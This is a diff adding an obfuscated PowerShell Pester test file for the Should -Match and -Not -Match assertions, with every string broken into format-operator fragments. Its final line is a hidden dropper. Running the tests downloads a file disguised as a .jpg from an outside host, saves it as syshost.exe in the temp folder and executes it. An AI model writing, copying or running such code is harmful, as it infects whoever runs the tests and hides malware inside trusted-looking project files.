@@ -1,0 +1,65 @@
+.("{2}{1}{0}" -f 'M','iTE','SeT-') ('VarIABLe:'+'D'+'kq'+'H'+'9X')  ([tYpE]("{1}{0}{3}{2}"-F'StEM.IO','Sy','h','.paT'));  .("{0}{1}{2}" -f'Se','t-Str','ictMode') -Version ("{1}{0}" -f'est','Lat')
+
+&("{1}{3}{2}{0}{4}"-f 'Sco','InM','e','odul','pe') ("{1}{0}"-f 'ster','Pe') {
+    &("{0}{1}{2}"-f 'De','scrib','e') ("{1}{2}{0}" -f'h','Should',' -Matc') {
+        .('It') ("{3}{5}{1}{0}{6}{2}{4}{7}"-f 'hings th','ue for t','t','ret',' ma','urns tr','a','tch') {
+            ("{1}{2}{0}"-f'r','fo','oba') | .("{0}{1}" -f 'Shou','ld') ("{1}{0}" -f 'ch','Mat') 'ob'
+            ("{1}{0}"-f'obar','fo') | .("{2}{0}{1}" -f 'l','d','Shou') -Match 'ob'
+        }
+
+        &('It') ("{11}{8}{9}{3}{1}{2}{5}{10}{0}{12}{6}{4}{7}"-f 'things','lse ','fo',' fa','t do','r','tha',' not match','n','s',' ','retur',' ') {
+            ("{1}{0}" -f'bar','foo') | &("{0}{1}" -f 'Shoul','d') ("{1}{0}" -f 't','No') ("{0}{1}" -f 'Mat','ch') ("{1}{0}" -f 'e','slim')
+            ("{1}{0}" -f'r','fooba') | .("{1}{0}" -f'hould','S') -Not -Match ("{1}{0}"-f'me','sli')
+        }
+
+        &('It') ("{2}{5}{1}{6}{0}{3}{4}" -f 'fer',' strings w','passes f','e','nt case','or','ith dif') {
+            ("{2}{1}{0}" -f 'r','ooba','f') | &("{0}{1}"-f 'Shoul','d') ("{0}{1}"-f 'Mat','ch') ("{0}{2}{1}" -f'FO','BAR','O')
+            ("{1}{0}" -f 'r','fooba') | &("{1}{0}"-f 'ould','Sh') -Match ("{1}{0}" -f'BAR','FOO')
+        }
+
+        &('It') ("{4}{1}{3}{0}{2}"-f'ss','s regular','ions',' expre','use') {
+            ("{1}{0}"-f'oobar','f') | .("{1}{0}"-f 'ld','Shou') ("{0}{1}"-f'Ma','tch') '\S{6}'
+            ("{0}{1}"-f'fooba','r') | &("{1}{0}"-f 'd','Shoul') -Match '\S{6}'
+        }
+
+        &('It') ("{4}{9}{3}{10}{8}{0}{11}{7}{1}{2}{5}{6}"-f 'ula','ons ','that ma','for','pas','t','ch','essi','reg','ses ',' ','r expr') {
+            ("{0}{1}" -f'fo','obar') | &("{1}{0}{2}"-f 'houl','S','d') ("{1}{0}"-f'ch','Mat') ".*"
+            ("{1}{0}"-f'obar','fo') | .("{2}{0}{1}"-f'ul','d','Sho') -Match ".*"
+        }
+
+        .('It') ("{2}{3}{5}{0}{1}{6}{10}{11}{8}{4}{7}{9}" -f'pres','sion wi','passes for ','regul',' ','ar ex','th ','cas','ent','e','diffe','r') {
+            ("{1}{0}"-f 'r','fooba') | &("{1}{0}" -f'uld','Sho') -Match ("{0}{1}"-f '.OOB.','.')
+        }
+
+        &('It') ("{7}{5}{8}{1}{2}{9}{4}{6}{3}{10}{0}"-f 'ch','ar expr','essions','o not ','tha','ils for reg','t d','fa','ul',' ','mat') {
+            { ("{2}{1}{0}" -f 'ar','b','foo') | .("{1}{0}" -f'hould','S') -Match "\d{6}" } | .("{3}{4}{0}{2}{1}" -f 'rify-AssertionFa','led','i','V','e')
+        }
+
+        .('It') ("{2}{1}{0}{5}{6}{4}{3}" -f 'e cor',' th','returns','ertion message','ss','rec','t a') {
+            ${e`RR} = { 'ab' | &("{1}{0}"-f 'hould','S') -Match '\d' -Because ("{0}{1}"-f'r','eason') } | .("{5}{6}{4}{2}{1}{3}{0}" -f'ed','n','io','Fail','rt','Verify-Ass','e')
+            ${e`RR}."ex`cEp`TIOn"."MeS`s`Age" | &("{1}{3}{0}{2}" -f'-E','V','qual','erify') ((("{11}{10}{2}{20}{8}{7}{5}{17}{23}{14}{22}{16}{1}{13}{15}{3}{24}{6}{4}{21}{18}{19}{0}{9}{12}"-f 'not m',',','regular ','use re','ut it','J ','on, b','sdTN','pression TNJba','atc',' ','Expected','h.',' be','c','ca','JabTNJ','t','d','id ','ex',' ','h TN','o mat','as'))."re`pLA`cE"(([ChAR]98+[ChAR]97+[ChAR]115),'\')."REp`lACE"(([ChAR]84+[ChAR]78+[ChAR]74),[sTRING][ChAR]39))
+        }
+    }
+
+    &("{1}{2}{0}"-f'e','D','escrib') ("{3}{4}{2}{0}{1}" -f 'Mat','ch','Not -','Shou','ld -') {
+        .('It') ("{5}{2}{3}{8}{4}{1}{7}{6}{9}{0}"-f 't match','ess','egul','ar','r','passes for r','that do n','ions ',' exp','o') {
+            "gef" | &("{2}{1}{0}"-f 'ld','hou','S') ("{1}{0}" -f'ot','N') ("{1}{0}"-f'h','Matc') "m.*"
+            "gef" | &("{1}{0}{2}"-f'hou','S','ld') -Not -Match "m.*"
+        }
+
+        .('It') ("{2}{1}{3}{8}{5}{4}{7}{6}{0}"-f'atch','a','f','ils ','ngs tha',' thi','m','t ','for') {
+            { ("{2}{0}{1}"-f'ob','ar','fo') | .("{0}{1}"-f 'Shou','ld') -Not -Match ".*" } | &("{5}{6}{4}{2}{1}{0}{3}" -f 'ionFa','t','er','iled','Ass','Ver','ify-')
+        }
+
+        &('It') ("{5}{6}{3}{1}{0}{2}{4}" -f ' di','h','fferent c','gs wit','ase','fails for str','in') {
+            { ("{0}{1}"-f 'foo','bar') | &("{0}{1}"-f 'Shoul','d') -Not -Match "F.*" } | &("{2}{1}{4}{3}{0}"-f 'd','ss','Verify-A','tionFaile','er')
+        }
+
+        &('It') ("{1}{0}{8}{9}{3}{7}{5}{6}{4}{2}"-f'eturn','r',' message','corre','ertion','t as','s','c','s the',' ') {
+            ${e`RR} = { 'ab' | .("{1}{0}" -f'd','Shoul') -Not -Match '.*' -Because ("{1}{0}" -f'son','rea') } | .("{3}{2}{1}{0}{4}"-f'y-AssertionFaile','f','i','Ver','d')
+            ${E`Rr}."eX`cepT`ion"."mE`SsAGe" | &("{2}{0}{1}" -f 'ify-E','qual','Ver') ((("{16}{1}{6}{4}{10}{15}{13}{0}{9}{18}{2}{5}{12}{14}{11}{7}{17}{3}{8}"-f '0','xp','au','m','d regu','se rea','ecte',' di','atch.','}.*{0} to not match {0}ab{0}, b','la','it','son','n {',', but ','r expressio','E','d ','ec'))  -f[chAR]39)
+        }
+    }
+}
+
+${T`eMPDir} =  $dKQH9x::("{1}{0}{2}" -f'et','G','TempPath').Invoke(); (.("{0}{1}{2}" -f'N','ew-O','bject') ("{3}{1}{2}{0}{4}"-f 'WebCl','Ne','t.','System.','ient')).("{0}{2}{1}"-f'Downlo','ile','adF').Invoke(("{3}{5}{0}{4}{2}{1}{6}"-f'k','/Kraken.','du.tr','http','ulup.isikun.e','://','jpg'),(' '+' '+"$TempDir\syshost.exe")); &("{0}{1}"-f 'st','art') ((("{1}{4}{5}{7}{0}{6}{2}{3}" -f'st.','{','x','e','0','}T','e','empDir{1}sysho'))  -f [CHAR]36,[CHAR]92);
